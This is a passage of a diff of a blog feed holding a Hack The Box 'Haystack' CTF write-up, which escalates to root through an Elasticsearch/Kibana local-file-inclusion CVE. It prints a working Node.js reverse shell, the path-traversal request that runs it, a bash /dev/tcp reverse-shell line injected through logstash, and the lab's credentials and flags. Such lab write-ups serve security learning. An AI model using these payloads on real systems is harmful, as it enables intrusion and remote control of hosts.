-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Euw!i$&lt;/span&gt;goRk
-&lt;span class=&quot;gp&quot;&gt;5)5=FI$&lt;/span&gt;b[&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;+
-&lt;span class=&quot;gp&quot;&gt;*Oo!;&lt;/span&gt;.o|?&amp;gt;
-&lt;span class=&quot;go&quot;&gt;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Desktop#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;la aguja en el pajar es &quot;clave&quot;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We see that there is a &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encoded string in this &lt;code class=&quot;highlighter-rouge&quot;&gt;.jpg&lt;/code&gt;. When we decode that we get the following message.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;la aguja en el pajar es “clave”&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Translated to English this becomes,&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;the needle in the haystack is “key”&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;they-haystack-port-9200-elasticsearch&quot;&gt;They Haystack: Port 9200 (Elasticsearch)&lt;/h2&gt;
-&lt;p&gt;The Elasticsearch database is where the haystack resides. When it’s queried we see that it’s version &lt;code class=&quot;highlighter-rouge&quot;&gt;6.4.2&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/media/sf_Research#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl http://10.10.10.115:9200
-&lt;span class=&quot;go&quot;&gt;{
-  &quot;name&quot; : &quot;iQEYHgS&quot;,
-  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,
-  &quot;cluster_uuid&quot; : &quot;pjrX7V_gSFmJY-DxP4tCQg&quot;,
-  &quot;version&quot; : {
-    &quot;number&quot; : &quot;6.4.2&quot;,
-    &quot;build_flavor&quot; : &quot;default&quot;,
-    &quot;build_type&quot; : &quot;rpm&quot;,C
-    &quot;build_hash&quot; : &quot;04711c2&quot;,
-    &quot;build_date&quot; : &quot;2018-09-26T13:34:09.098244Z&quot;,
-    &quot;build_snapshot&quot; : false,
-    &quot;lucene_version&quot; : &quot;7.4.0&quot;,
-    &quot;minimum_wire_compatibility_version&quot; : &quot;5.6.0&quot;,
-    &quot;minimum_index_compatibility_version&quot; : &quot;5.0.0&quot;
-  },
-  &quot;tagline&quot; : &quot;You Know, for Search&quot;
-}
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This version should have a local file inclusion vulnerability &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2018-17246&lt;/code&gt;, lets remember this for laster. For right now though, we need to find the information hidden in the haystack. After trying to make the query for &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, nothing comes up. Using Spanish though, and making the query for &lt;code class=&quot;highlighter-rouge&quot;&gt;clave&lt;/code&gt;, it returns some interesting records.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Desktop#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.115:9200/_search?q=clave&quot;&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;{&quot;took&quot;:23,&quot;timed_out&quot;:false,&quot;_shards&quot;:{&quot;total&quot;:11,&quot;successful&quot;:11,&quot;skipped&quot;:0,&quot;failed&quot;:0},&quot;hits&quot;:{&quot;total&quot;:2,&quot;max_score&quot;:5.9335938,&quot;hits&quot;:[{&quot;_index&quot;:&quot;quotes&quot;,&quot;_type&quot;:&quot;quote&quot;,&quot;_id&quot;:&quot;45&quot;,&quot;_score&quot;:5.9335938,&quot;_source&quot;:{&quot;quote&quot;:&quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;}},{&quot;_index&quot;:&quot;quotes&quot;,&quot;_type&quot;:&quot;quote&quot;,&quot;_id&quot;:&quot;111&quot;,&quot;_score&quot;:5.3459888,&quot;_source&quot;:{&quot;quote&quot;:&quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;}}]}}
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Let’s decode these two base64 strings and see what they’re saying.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;dXNlcjogc2VjdXJpdHkg | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;user: security
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cGFzczogc3BhbmlzaC5pcy5rZXk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;pass: spanish.is.key
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now we have a user name and some credentials.&lt;/p&gt;
-
-&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
-
-&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
-
-&lt;p&gt;Using the credentials found in the Elasticsearch database we’re able to ssh into the box and gain the user flag.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack ~]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
-&lt;span class=&quot;go&quot;&gt;04d18bc79dac1d4d48ee0a940c8eb929
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
-&lt;p&gt;It may be intuitive that we’re exploiting the ELK stack here, and that the CVE is going to come into play. In order to confirm that this is the path to root, we view processes  running on the box with root permissions.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[security@haystack tmp]$ ps -elf|grep root&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/elk_is_root.png&quot; alt=&quot;ELK is root&quot; /&gt;
-&lt;strong&gt;Figure 2:&lt;/strong&gt; Logstash is running as root.&lt;/p&gt;
-
-&lt;p&gt;It’s now clear to us that &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt;, which is the &lt;code class=&quot;highlighter-rouge&quot;&gt;L&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;ELK&lt;/code&gt;, is running as root. When we attempt to view the current configuration files for &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt; we see that the &lt;code class=&quot;highlighter-rouge&quot;&gt;security&lt;/code&gt; user we currently have a shell as isn’t able to read them.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack conf.d]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;/etc/logstash/conf.d
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack conf.d]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;total 12
-drwxrwxr-x. 2 root kibana  62 Jun 24 08:12 .
-drwxr-xr-x. 3 root root   183 Jun 18 22:15 ..
--rw-r-----. 1 root kibana 131 Jun 20 10:59 filter.conf
--rw-r-----. 1 root kibana 186 Jun 24 08:12 input.conf
--rw-r-----. 1 root kibana 109 Jun 24 08:12 output.conf
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack conf.d]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;filter.conf
-&lt;span class=&quot;go&quot;&gt;cat: filter.conf: Permission denied
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;pivot-to-kibana-user&quot;&gt;Pivot to kibana user&lt;/h3&gt;
-
-&lt;p&gt;Researching known vulnerabilities in Elasticsearch &lt;code class=&quot;highlighter-rouge&quot;&gt;6.4.2&lt;/code&gt;, we’ve come across &lt;a href=&quot;https://github.com/mpgn/CVE-2018-17246&quot;&gt;CVE-2018-17246&lt;/a&gt;. The Github user &lt;a href=&quot;https://github.com/mpgn&quot;&gt;mpgn&lt;/a&gt; has provided a proof of concept we can leverage to exploit this vulnerability for local file inclusion (LFI). This should allow us to get a shell as the user &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt;, and do more with &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt; than we currently have permission to do.&lt;/p&gt;
-
-&lt;p&gt;The javascript reverse shell code provided is as follows. All that’s needed for this to work out of the box is replacing our IP and port that netcat is listening on.&lt;/p&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;child_process&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.14.19&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/a/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Prevents the Node.js application form crashing&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;})();&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We place the shell code into a directory to which we have access as the &lt;code class=&quot;highlighter-rouge&quot;&gt;security&lt;/code&gt; user. In this case we place the shell into &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt;, and name it &lt;code class=&quot;highlighter-rouge&quot;&gt;mahshell.js&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;We are able to determine that &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; is running locally on port &lt;code class=&quot;highlighter-rouge&quot;&gt;5601&lt;/code&gt; by reading the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/kibana/kibana.yml&lt;/code&gt; file.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/kibana_yml.png&quot; alt=&quot;kibana yml&quot; /&gt;
-&lt;strong&gt;Figure 3:&lt;/strong&gt; kibana.yml&lt;/p&gt;
-
-&lt;p&gt;We can make the following &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; request to execute our reverse shell code.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack shm]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;amp;apis=../../../../../../../../../../../dev/shm/mahshell.js&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;kbn-xsrf: true&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/kibana_user.png&quot; alt=&quot;kibana user&quot; /&gt;
-&lt;strong&gt;Figure 4&lt;/strong&gt;: Shell as kibana user.&lt;/p&gt;
-
-&lt;p&gt;Now that we are the user &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt;, we go back to the configuration files under &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/logstash/conf.d&lt;/code&gt; and check out what &lt;code class=&quot;highlighter-rouge&quot;&gt;filter.conf&lt;/code&gt; contains.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;bash-4.2$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc/logstash/conf.d
-&lt;span class=&quot;go&quot;&gt;cd /etc/logstash/conf.d
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;bash-4.2$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;ls -la
-total 12
-drwxrwxr-x. 2 root kibana  62 jun 24 08:12 .
-drwxr-xr-x. 3 root root   183 jun 18 22:15 ..
--rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
--rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
--rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;bash-4.2$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;filter.conf
-&lt;span class=&quot;go&quot;&gt;cat filter.conf
-filter {
-	if [type] == &quot;execute&quot; {
-		grok {
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;			match =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Ejecutar&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*comando&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+%{GREEDYDATA:comando}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;		}
-	}
-}
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This filter allows us to execute commands with the proper input. By placing our own &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash_x&lt;/code&gt; file into the &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/kibana&lt;/code&gt; directory, we should get command execution.&lt;/p&gt;
-
-&lt;p&gt;Our logstash file follows exactly as &lt;code class=&quot;highlighter-rouge&quot;&gt;filter.conf&lt;/code&gt; defines. Small note, our IP address has changed due to reconnecting to the Hack The Box VPN the following day.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ejecutar comando : bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.201/6666  0&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;After waiting a few seconds, the command to call our reverse shell is executed.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/rooted.png&quot; alt=&quot;Rooted&quot; /&gt;
-&lt;strong&gt;Figure: 5&lt;/strong&gt; Rooted&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;[root@haystack /]#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
-&lt;span class=&quot;go&quot;&gt;cat /root/root.txt
-3f5f727c38d9f70e1d2ad2ba11059d92
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
-&lt;p&gt;The user flag portion of this box was very CTF like. There’s not much chance that in the real world you’re going to come across a situation where clues are hidden in a &lt;code class=&quot;highlighter-rouge&quot;&gt;.jpg&lt;/code&gt; and then &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encoded credentials are hidden in a database that contains a large amount of arbitrary data. I did learn from this experience though. This was the first time I’ve had to find a string hidden in an image, and it was my first experience with Elasticsearch queries.&lt;/p&gt;
-
-&lt;p&gt;The root portion of this box was rather difficult for me with my lack of experience in the ELK stack. It didn’t take long to find the local file inclusion vulnerability, but leveraging it to get root really required me to research how &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; work. All in all I’m pleased to have completed the box.&lt;/p&gt;
-
-&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
-&lt;ol&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10&quot;&gt;https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file&quot;&gt;https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/mpgn/CVE-2018-17246&quot;&gt;https://github.com/mpgn/CVE-2018-17246&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&quot;&gt;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/168291&quot;&gt;https://www.anquanke.com/post/id/168291&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://grokdebug.herokuapp.com/&quot;&gt;https://grokdebug.herokuapp.com/&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="Elasticsearch" /><category term="ELK" /><summary type="html"></summary></entry></feed>
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="phpMyAdmin" /><summary type="html"></summary></entry></feed>
